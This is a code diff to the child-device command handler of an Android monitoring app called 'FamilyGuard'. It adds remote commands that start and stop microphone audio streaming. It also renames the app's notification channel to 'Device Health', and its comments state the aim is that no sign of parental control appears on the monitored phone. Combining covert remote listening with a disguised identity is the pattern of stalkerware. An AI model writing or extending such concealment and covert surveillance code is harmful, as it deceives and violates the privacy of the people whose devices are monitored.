@@ -21,6 +21,7 @@ import com.familyguard.child.data.Api
 import com.familyguard.child.data.ChildApp
 import com.familyguard.child.data.Store
 import com.familyguard.child.service.Locator
+import com.familyguard.child.service.AudioStreamer
 import com.familyguard.child.service.MirrorManager
 import com.familyguard.child.service.WsChild
 import com.familyguard.child.ui.BlockOverlay
@@ -60,6 +61,24 @@ object CommandHandler {
 
             "ring" -> {
                 RingPlayer.start(ctx)
+                data.addProperty("status", "ringing")
+                Pair(true, data)
+            }
+
+            "ring_stop" -> {
+                // Same button toggle: parent ne "Ring band karo" tap kiya
+                RingPlayer.stop()
+                Pair(true, data)
+            }
+
+            "audio_start" -> {
+                val (ok, d) = AudioStreamer.start(ctx)
+                data.add("audio", d)
+                Pair(ok, data)
+            }
+
+            "audio_stop" -> {
+                AudioStreamer.stop()
                 Pair(true, data)
             }
 
@@ -192,7 +211,7 @@ object CommandHandler {
                 BlockOverlay.show(ctx, BlockOverlay.Reason.MESSAGE, title, text)
                 runCatching {
                     ensureChannel(ctx)
-                    val n = NotificationCompat.Builder(ctx, "fg_service")
+                    val n = NotificationCompat.Builder(ctx, CH_FG)
                         .setSmallIcon(android.R.drawable.ic_dialog_info)
                         .setContentTitle(title)
                         .setContentText(text)
@@ -235,11 +254,18 @@ object CommandHandler {
         }
     }
 
+    companion object {
+        // Neutral brand — bachche ke phone par kahi bhi "FamilyGuard"/parental-control
+        // na dikhe. Notification text ab "Device Health" theme me hai.
+        const val CH_FG = "dh_service"
+    }
+
     private fun ensureChannel(ctx: Context) {
         runCatching {
             val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.deleteNotificationChannel("fg_service") // purana branded channel hatao
             nm.createNotificationChannel(
-                NotificationChannel("fg_service", "FamilyGuard", NotificationManager.IMPORTANCE_MIN)
+                NotificationChannel(CH_FG, "Device Health", NotificationManager.IMPORTANCE_MIN)
             )
         }
     }
@@ -282,7 +308,7 @@ object CommandHandler {
                 PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
             )
             ensureChannel(ctx)
-            val n = NotificationCompat.Builder(ctx, "fg_service")
+            val n = NotificationCompat.Builder(ctx, CH_FG)
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setContentTitle("Screen sharing")
                 .setContentText("Tap to allow screen sharing")
